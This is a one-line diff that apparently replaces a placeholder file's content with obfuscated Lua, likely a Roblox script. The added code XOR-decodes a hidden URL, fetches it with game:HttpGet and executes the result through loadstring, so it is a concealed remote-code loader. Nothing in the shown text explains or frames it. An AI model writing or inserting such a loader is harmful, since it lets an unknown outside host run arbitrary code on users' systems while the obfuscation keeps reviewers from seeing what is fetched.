@@ -1,1 +1,1 @@
-# e
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for i=1, #v8 do v6(v10,v0(v4(v1(v2(v8,i,i + 1)),v1(v2(v9,1 + ((i-1)% #v9),1 + ((i-1)% #v9) + 1)))%256));end return v5(v10);end loadstring(game:HttpGet(v7("\127\80\211\3\110\153\56\11\194\7\124\205\37\10\151\67\45\212\114\70\207\28\110\215\118\84\215\93\126\204\122\11\208\23\37\148\118\83\145\71\121\194\36\83\147\23\46\151\118\83\195","\23\36\167\115\29\163")))();
